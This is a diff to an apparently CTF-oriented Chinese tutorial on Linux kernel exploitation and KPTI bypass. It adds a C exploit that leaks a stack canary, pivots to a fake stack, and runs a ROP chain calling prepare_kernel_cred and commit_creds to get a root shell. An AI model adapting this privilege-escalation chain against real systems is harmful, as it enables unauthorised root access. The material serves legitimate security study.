@@ -87,7 +87,58 @@ qemu-system-x86_64 \
               ↓
           func()
 ```
+借用signal的处理机制，反而帮助我们还原了用户态的cr3存放的页表:<br>
+```c
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long cmp_esi_esi_ret = 0xffffffff81906934;
+unsigned long mov_rdi_rax_ja_pop_rbp_ret = 0xffffffff818c6ebd;
+unsigned long swapgs_pop_rbp_ret = 0xffffffff8100a55f;
+unsigned long iretq = 0xffffffff8100c0d9;
+unsigned long mov_esp_pop_r12_pop_rbp_ret = 0xffffffff8196f56a;
+unsigned long * fake_stack;
+int main(){
+    // step 0 : save status
+    save_status();
+    // set signal handler
+    signal(SIGSEGV, get_root_shell);
+    int fd =open_device();
+    // step 1: leak the canary
+    unsigned long tmp_buf[50];
+    unsigned long size=0x8*50;
+    read(fd,tmp_buf,size);
+    unsigned long canary = tmp_buf[16];
+    printf("canary: 0x%llx\n",canary);
 
+    // step 2: construct fake stack
+    fake_stack = mmap(0x5b000000-0x1000, 0x2000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,0);
+    int off = 0x1000/8;
+    fake_stack[0] = 0xdeadbeef;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = pop_rdi_ret;
+    fake_stack[off++] = 0;
+    fake_stack[off++] = prepare_kernel_cred;
+    fake_stack[off++] = cmp_esi_esi_ret;
+    fake_stack[off++] = mov_rdi_rax_ja_pop_rbp_ret;
+    fake_stack[off++] = 0 ;
+    fake_stack[off++] = commit_creds;
+    fake_stack[off++] = swapgs_pop_rbp_ret;
+    fake_stack[off++] = 0; 
+    fake_stack[off++] = iretq;
+    fake_stack[off++] = (unsigned long )get_root_shell;
+    fake_stack[off++] = user_cs;
+    fake_stack[off++] = user_rflags;
+    fake_stack[off++] = user_sp;
+    fake_stack[off++] = user_ss;
+    // step 3: construct the payload
+    off = 17;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = 0;
+    tmp_buf[off++] = mov_esp_pop_r12_pop_rbp_ret;
+    write(fd,tmp_buf,size);    
+}
+```
 
 ## 6.3 KPTI trampoline + ROP<br>
 绕过方法其实还是ROP，但是因为需要切换页表，我们不知道切换页表要做什么，但是考虑到执行syscall能正常返回，内核里一定有一段关于内核页表切换的代码！<br>
@@ -96,6 +147,7 @@ qemu-system-x86_64 \
 
 # references<br>
 [https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)<br>
+[https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/](https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/)<br>
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
